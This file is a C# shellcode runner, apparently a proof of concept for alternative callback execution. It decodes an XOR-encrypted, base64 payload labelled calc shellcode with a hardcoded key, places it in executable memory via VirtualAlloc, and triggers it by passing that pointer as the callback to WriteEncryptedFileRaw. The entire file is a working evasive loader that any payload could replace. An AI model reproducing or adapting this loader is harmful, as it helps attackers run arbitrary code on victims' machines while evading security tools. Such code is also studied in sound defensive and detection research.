using System;
using System.Runtime.InteropServices;

namespace AltCallbacks
{
    class Callback
    {
        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        const uint CREATE_FOR_IMPORT = 1;

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("Advapi32.dll")]
        static extern uint OpenEncryptedFileRaw(string lpFileName, uint ulFlags, out IntPtr pvContext);

        [DllImport("Advapi32.dll")]
        static extern uint WriteEncryptedFileRaw(IntPtr pfImportCallback, IntPtr pvCallbackContext, IntPtr pvContext);

        [DllImport("Advapi32.dll")]
        static extern uint CloseEncryptedFileRaw(IntPtr pvContext);

        static string key = "THISISMYKEY";

        static void Main(string[] args)
        {
            IntPtr myHDSA = IntPtr.Zero;

            // Calc shellcode
            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";

            byte[] decoded = Convert.FromBase64String(base64);
            byte[] shellcode = new byte[decoded.Length];

            for (int i = 0; i < decoded.Length; i++)
                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));

            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(shellcode, 0, p, shellcode.Length);

            IntPtr pContext = IntPtr.Zero;

            // Create temp file on disk
            string tempFile = System.IO.Path.GetTempFileName();
            
            OpenEncryptedFileRaw(tempFile, CREATE_FOR_IMPORT, out pContext);

            // Callback function
            WriteEncryptedFileRaw(p, IntPtr.Zero, pContext);

            // Cleanup
            System.Thread.Sleep(500);
            CloseEncryptedFileRaw(pContext);

            return;
        }
    }
}
